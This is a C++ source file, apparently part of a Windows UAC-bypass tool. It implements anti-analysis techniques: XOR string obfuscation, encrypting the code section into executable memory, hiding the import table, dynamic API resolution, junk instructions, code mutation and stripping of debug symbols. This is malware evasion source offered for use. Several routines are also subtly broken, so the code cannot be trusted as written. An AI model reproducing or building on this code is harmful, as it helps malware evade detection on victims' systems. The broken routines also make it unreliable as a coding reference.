#include "../include/ObfuscationUtils.h"
#include <random>
#include <algorithm>
#include <numeric>
#include <intrin.h>
#include <winternl.h>
#include <memory>

namespace uac_bypass {

// Inizializzazione variabili statiche
ObfuscationUtils::GetProcAddressType ObfuscationUtils::cachedGetProcAddress = nullptr;
ObfuscationUtils::LoadLibraryType ObfuscationUtils::cachedLoadLibrary = nullptr;

ObfuscationUtils::ObfuscationUtils() 
    : logger(Logger::getInstance()),
      initialized(false) {
    initializeDynamicAPIs();
}

ObfuscationUtils::~ObfuscationUtils() {
    // Cleanup sezioni protette
    for (auto section : protectedSections) {
        VirtualFree(section, 0, MEM_RELEASE);
    }
}

ObfuscationUtils& ObfuscationUtils::getInstance() {
    static ObfuscationUtils instance;
    return instance;
}

std::wstring ObfuscationUtils::obfuscateString(const std::wstring& input, DWORD seed) {
    std::wstring result = input;
    std::mt19937 rng(seed);
    
    // XOR con chiave dinamica
    for (size_t i = 0; i < result.length(); i++) {
        result[i] ^= static_cast<wchar_t>(rng() & 0xFFFF);
    }
    
    // Shuffle caratteri
    std::shuffle(result.begin(), result.end(), rng);
    
    return result;
}

std::wstring ObfuscationUtils::deobfuscateString(const std::wstring& input, DWORD seed) {
    std::wstring result = input;
    std::mt19937 rng(seed);
    
    // Memorizza sequenza di shuffle
    std::vector<size_t> indices;
    for (size_t i = 0; i < result.length(); i++) {
        indices.push_back(i);
    }
    std::shuffle(indices.begin(), indices.end(), rng);
    
    // Reverse shuffle
    std::wstring temp(result.length(), L'\0');
    for (size_t i = 0; i < indices.size(); i++) {
        temp[indices[i]] = result[i];
    }
    
    // Reverse XOR
    for (size_t i = 0; i < temp.length(); i++) {
        temp[i] ^= static_cast<wchar_t>(rng() & 0xFFFF);
    }
    
    return temp;
}

bool ObfuscationUtils::protectCodeSection() {
    // Ottieni base dell'immagine
    HMODULE hModule = GetModuleHandleW(NULL);
    if (!hModule) return false;

    // Ottieni headers
    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hModule) + dosHeader->e_lfanew);

    // Trova sezione .text
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section->Name, ".text", 5) == 0) {
            // Alloca nuova sezione con protezione
            SIZE_T sectionSize = section->Misc.VirtualSize;
            BYTE* baseAddress = reinterpret_cast<BYTE*>(hModule) + section->VirtualAddress;
            
            BYTE* newSection = reinterpret_cast<BYTE*>(VirtualAlloc(NULL,
                sectionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
            
            if (!newSection) return false;

            // Copia e cifra codice
            memcpy(newSection, baseAddress, sectionSize);
            if (!encryptSection(newSection, sectionSize)) {
                VirtualFree(newSection, 0, MEM_RELEASE);
                return false;
            }
    
            // Cambia protezione
            DWORD oldProtect;
            if (!VirtualProtect(newSection, sectionSize,
                PAGE_EXECUTE_READ, &oldProtect)) {
                VirtualFree(newSection, 0, MEM_RELEASE);
                return false;
            }
            
            protectedSections.push_back(newSection);
            return true;
        }
        section++;
    }
    return false;
}

bool ObfuscationUtils::hideImportTable() {
    HMODULE hModule = GetModuleHandleW(NULL);
    if (!hModule) return false;

    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hModule) + dosHeader->e_lfanew);
    
    // Nasconde import table
    DWORD oldProtect;
    if (!VirtualProtect(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &oldProtect)) {
        return false;
    }
    
    // Azzera entry
    memset(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        0, sizeof(IMAGE_DATA_DIRECTORY));
    
    // Ripristina protezione
    DWORD temp;
    VirtualProtect(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        sizeof(IMAGE_DATA_DIRECTORY), oldProtect, &temp);
    
    return true;
}

bool ObfuscationUtils::obfuscateControlFlow() {
    // Implementa control flow flattening
    bool result = false;
    __try {
        result = implementJunkCode() && addFalseControlFlow();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        result = false;
    }
    return result;
}

FARPROC ObfuscationUtils::resolveAPI(const char* apiName) {
    if (!cachedGetProcAddress) {
        HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
        if (!kernel32) return nullptr;
        
        cachedGetProcAddress = (GetProcAddressType)GetProcAddress(
            kernel32, "GetProcAddress");
        if (!cachedGetProcAddress) return nullptr;
    }
    
    // Calcola hash del nome API
    DWORD hash = 0;
    for (const char* p = apiName; *p; p++) {
        hash = ((hash << 5) + hash) + *p;
    }
    
    // Cerca nelle DLL di sistema
    const wchar_t* systemDlls[] = {
        L"kernel32.dll",
        L"user32.dll",
        L"advapi32.dll",
        L"ntdll.dll"
    };
    
    for (const auto& dll : systemDlls) {
        HMODULE hModule = resolveModule(dll);
        if (!hModule) continue;
        
        FARPROC addr = cachedGetProcAddress(hModule, apiName);
        if (addr) return addr;
    }
    
    return nullptr;
}

bool ObfuscationUtils::initializeDynamicAPIs() {
    if (initialized) return true;
    
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) return false;
    
    cachedGetProcAddress = (GetProcAddressType)GetProcAddress(
        kernel32, "GetProcAddress");
    cachedLoadLibrary = (LoadLibraryType)GetProcAddress(
        kernel32, "LoadLibraryW");
    
    if (!cachedGetProcAddress || !cachedLoadLibrary) {
        return false;
    }
    
    initialized = true;
    return true;
}

bool ObfuscationUtils::randomizeExecution() {
    std::random_device rd;
    std::mt19937 rng(rd());
    std::uniform_int_distribution<int> dist(1, 1000);
    
    // Inserisce delay random
    Sleep(dist(rng) % 10);
    
    // Esegue operazioni fittizie
    volatile int dummy = 0;
    for (int i = 0; i < (dist(rng) % 100); i++) {
        dummy += dist(rng);
    }
    
    return (dist(rng) % 2) == 0;
}

bool ObfuscationUtils::implementJunkCode() {
    // Inserisce istruzioni junk
    BYTE junkCode[] = {
        0x90,       // NOP
        0x87, 0xDB, // XCHG EBX,EBX
        0x87, 0xC9, // XCHG ECX,ECX
        0x90,       // NOP
        0xF8,       // CLC
        0xF9,       // STC
        0x90        // NOP
    };
    
    for (auto section : protectedSections) {
        insertJunkInstructions(section);
    }
    
    return true;
}

bool ObfuscationUtils::addFalseControlFlow() {
    // Implementa false branches
    std::random_device rd;
    std::mt19937 rng(rd());
    
    for (auto section : protectedSections) {
        if (rng() % 2) {
            // Aggiunge branch fittizio
            BYTE* target = section + (rng() % 1000);
            insertJunkInstructions(target);
        }
    }
    
    return true;
}

bool ObfuscationUtils::protectStrings() {
    // Cifra stringhe in memoria
    MEMORY_BASIC_INFORMATION mbi;
    BYTE* address = (BYTE*)GetModuleHandleW(NULL);
    
    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT && 
            (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED)) {
            encryptSection((BYTE*)mbi.BaseAddress, mbi.RegionSize);
        }
        address += mbi.RegionSize;
    }
    
    return true;
}

bool ObfuscationUtils::encryptConstants() {
    // Cifra costanti in memoria
    return protectStrings();
}

bool ObfuscationUtils::hideCallStack() {
    // Manipola stack frame
    return obfuscateStackFrame();
}

bool ObfuscationUtils::implementPolymorphicCode() {
    return setupPolymorphicEngine() && addCodeMutation();
}

bool ObfuscationUtils::addCodeMutation() {
    // Muta codice periodicamente
    for (auto section : protectedSections) {
        mutateCodeSection();
    }
    return true;
}

bool ObfuscationUtils::obfuscateMetadata() {
    return hideDebugInfo() && hideDebugSymbols();
}

HMODULE ObfuscationUtils::resolveModule(const wchar_t* moduleName) {
    if (!cachedLoadLibrary) return nullptr;
    return cachedLoadLibrary(moduleName);
}

void* ObfuscationUtils::getAPIAddress(HMODULE module, const char* apiName) {
    if (!cachedGetProcAddress) return nullptr;
    return (void*)cachedGetProcAddress(module, apiName);
}

void ObfuscationUtils::shuffleInstructions(BYTE* start, SIZE_T size) {
    std::random_device rd;
    std::mt19937 rng(rd());
    
    // Shuffle mantenendo allineamento
    for (SIZE_T i = 0; i < size - 4; i += 4) {
        std::shuffle(start + i, start + i + 4, rng);
    }
}

void ObfuscationUtils::insertJunkInstructions(BYTE* location) {
    BYTE junkCode[] = {
        0x90,       // NOP
        0x87, 0xDB, // XCHG EBX,EBX
        0x87, 0xC9  // XCHG ECX,ECX
    };
    
    memcpy(location, junkCode, sizeof(junkCode));
}

bool ObfuscationUtils::encryptSection(BYTE* start, SIZE_T size) {
    if (size < MIN_SECTION_SIZE) return false;
    
    // Cifra sezione con XOR rolling
    BYTE key = 0x5A;
    for (SIZE_T i = 0; i < size; i++) {
        start[i] ^= key;
        key = start[i];
    }
    
    return true;
}

bool ObfuscationUtils::protectImportTable() {
    return hideImportTable();
}

bool ObfuscationUtils::hideDebugSymbols() {
    BYTE* baseAddress = (BYTE*)GetModuleHandleW(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
    
    // Rimuove simboli debug
    ntHeaders->FileHeader.PointerToSymbolTable = 0;
    ntHeaders->FileHeader.NumberOfSymbols = 0;
    
    return true;
}

bool ObfuscationUtils::obfuscateStackFrame() {
    // Manipola stack frame
    __try {
        _alloca(rand() % 1000);  // Stack randomization
        return true;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
}

bool ObfuscationUtils::setupPolymorphicEngine() {
    // Setup engine di mutazione
    return initializeEncryption();
}

bool ObfuscationUtils::initializeEncryption() {
    std::random_device rd;
    std::mt19937 rng(rd());
    
    // Inizializza chiavi di cifratura
    for (auto section : protectedSections) {
        encryptSection(section, MIN_SECTION_SIZE);
    }
    
    return true;
}

void ObfuscationUtils::mutateCodeSection() {
    std::random_device rd;
    std::mt19937 rng(rd());
    
    for (auto section : protectedSections) {
        // Muta codice mantenendo funzionalità
        shuffleInstructions(section, MIN_SECTION_SIZE);
        insertJunkInstructions(section + (rng() % 1000));
    }
}

bool ObfuscationUtils::hideDebugInfo() {
    // Rimuove informazioni debug
    return hideDebugSymbols();
}

} // namespace uac_bypass